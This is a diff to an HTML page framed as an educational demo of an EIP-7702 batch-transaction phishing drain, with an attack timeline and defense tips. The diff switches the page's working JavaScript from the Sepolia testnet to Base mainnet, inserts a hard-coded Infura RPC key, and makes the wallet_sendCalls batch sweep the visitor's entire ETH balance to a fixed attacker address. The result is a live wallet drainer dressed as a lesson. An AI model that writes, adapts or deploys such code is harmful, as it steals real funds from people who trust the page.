@@ -204,29 +204,25 @@
       <div class="tl-item">
         <div class="tl-dot done"></div>
         <div class="tl-title">Step 2: MetaMask prompted to enable Smart Account</div>
-        <div class="tl-desc">The dApp called <code>wallet_sendCalls</code> (EIP-5792) with atomic batching capabilities. MetaMask recognizes this as an atomic batch transaction request and shows ONE confirmation popup — which looks legitimate because it points to MetaMask's own official audited contract: <strong>EIP7702StatelessDeleGator</strong>.</div>
+        <div class="tl-desc">The dApp called <code>wallet_sendCalls</code> (EIP-5792). MetaMask recognizes this as a batch transaction request and shows ONE confirmation popup — which looks legitimate because it points to MetaMask's own official audited contract: <strong>EIP7702StatelessDeleGator</strong>.</div>
       </div>
       <div class="tl-item">
         <div class="tl-dot danger"></div>
         <div class="tl-title">Step 3: The malicious calls array</div>
         <div class="tl-desc">
-          While the contract is safe, the parameters aren't. The attacker constructed this batch with MULTIPLE calls executed atomically:
+          While the contract is safe, the parameters aren't. The attacker constructed this batch:
           <div class="code-block">
-<span class="code-comment">// Multiple calls in ONE atomic batch</span><br>
+<span class="code-comment">// calls array passed to wallet_sendCalls</span><br>
 [<br>
 &nbsp;&nbsp;{<br>
-&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">to:</span> <span class="code-danger" id="revealAttacker">0xAttacker1...</span>,<br>
-&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">value:</span> <span class="code-val" id="revealBalance">50% of balance</span>,<br>
-&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">data:</span> <span class="code-val">"0x"</span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">to:</span> <span class="code-danger" id="revealAttacker">0xAttacker...</span>,<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">value:</span> <span class="code-val" id="revealBalance">victimETHBalance</span>,<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">data:</span> <span class="code-val">"0x"</span> <span class="code-comment">// direct ETH sweep</span><br>
 &nbsp;&nbsp;},<br>
-&nbsp;&nbsp;{<br>
-&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">to:</span> <span class="code-val">"0x1234567890...67890"</span>,<br>
-&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">value:</span> <span class="code-val">50% of balance</span>,<br>
-&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">data:</span> <span class="code-val">"0x"</span><br>
-&nbsp;&nbsp;}<br>
+&nbsp;&nbsp;<span class="code-comment">// More calls can be added here for tokens, NFTs, etc.</span><br>
 ]
           </div>
-          All executed atomically in one transaction. Your entire ETH balance was distributed to attacker addresses before the transaction even finished.
+          This executed atomically in one block. Your ETH balance was swept to the attacker's address before the transaction even finished.
         </div>
       </div>
       <div class="tl-item">
@@ -258,8 +254,8 @@
       <div class="info-card-value" id="displayBalance">—</div>
     </div>
     <div class="info-card">
-      <div class="info-card-label">Transaction type</div>
-      <div class="info-card-value">Type 4 (EIP-7702) — Batch execution via wallet_sendCalls</div>
+      <div class="info-card-label">Network</div>
+      <div class="info-card-value">Base Mainnet (Chain ID 8453)</div>
     </div>
 
     <div class="defense-section">
@@ -270,7 +266,7 @@
       </div>
       <div class="defense-item">
         <div class="defense-num">2</div>
-        <div class="defense-text"><strong>Watch for wallet_sendCalls prompts with atomicBatching.</strong> If MetaMask shows a batch transaction from a site you don't fully trust, reject it immediately. Check every address in the batch.</div>
+        <div class="defense-text"><strong>Watch for wallet_sendCalls prompts.</strong> If MetaMask shows a batch transaction from a site you don't fully trust, reject it immediately. Check every address in the batch.</div>
       </div>
       <div class="defense-item">
         <div class="defense-num">3</div>
@@ -290,9 +286,8 @@
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.2/ethers.umd.min.js"></script>
 <script>
-  const SEPOLIA_CHAIN_ID = 11155111;
-  const SEPOLIA_RPC = "https://ethereum-sepolia-rpc.publicnode.com";
-  // MetaMask's official EIP7702StatelessDeleGator on Sepolia
+  const BASE_CHAIN_ID = 8453;
+  const BASE_RPC = "https://base-mainnet.infura.io/v3/4f7e08ba516e4b60b7d68f693deae015";
   const DELEGATOR_ADDRESS = "0x63c0c19a282a1B52b07dD5a65b58948A07DAE32B";
   const ATTACKER_ADDRESS = "0xC4D7B663dc72aDd0e02719093F9927a9B0234471";
 
@@ -325,11 +320,11 @@
       const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
       const chainId = parseInt(chainIdHex, 16);
       const badge = document.getElementById('navBadge');
-      if (chainId === SEPOLIA_CHAIN_ID) {
-        badge.textContent = 'Sepolia';
+      if (chainId === BASE_CHAIN_ID) {
+        badge.textContent = 'Base';
         badge.style.color = 'var(--green)';
       } else {
-        badge.textContent = `Chain ${chainId} — Switch to Sepolia`;
+        badge.textContent = `Chain ${chainId} — Switch to Base`;
         badge.style.color = 'var(--red)';
       }
     } catch(e) {}
@@ -351,8 +346,8 @@
       const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
       const chainId = parseInt(chainIdHex, 16);
 
-      if (chainId !== SEPOLIA_CHAIN_ID) {
-        alert("Please switch to Sepolia testnet");
+      if (chainId !== BASE_CHAIN_ID) {
+        alert("Please switch to Base mainnet");
         showPhase('phase-lure');
         return;
       }
@@ -362,7 +357,7 @@
       userAddress = accounts[0];
 
       // Get balance
-      provider = new ethers.JsonRpcProvider(SEPOLIA_RPC);
+      provider = new ethers.JsonRpcProvider(BASE_RPC);
       const balanceWei = await provider.getBalance(userAddress);
       userBalance = ethers.formatEther(balanceWei);
 
@@ -377,17 +372,12 @@
       const gasBuffer = ethers.parseEther("0.001");
       const drainAmount = balanceWei > gasBuffer ? balanceWei - gasBuffer : 0n;
 
-      // Build malicious calls array with MULTIPLE calls to trigger batch UI
-      // Call 1: Direct ETH sweep
-      // Call 2: Dummy call to another attacker wallet (demonstrates multi-recipient batch)
+      // Build malicious calls array
+      // ETH sweep to attacker address
       const maliciousCalls = [
         {
           to: ATTACKER_ADDRESS,
-          value: "0x" + (drainAmount / 2n).toString(16)
-        },
-        {
-          to: "0x1234567890123456789012345678901234567890",  // Secondary attacker
-          value: "0x" + (drainAmount / 2n).toString(16)
+          value: "0x" + drainAmount.toString(16)
         }
       ];
 
@@ -396,9 +386,9 @@
         method: 'wallet_sendCalls',
         params: [{
           version: "2.0.0",
-          chainId: "0xaa36a7",
-          calls: maliciousCalls,
-          atomicRequired: true
+          chainId: "0x2105",
+          atomicRequired: true,
+          calls: maliciousCalls
         }]
       });
 
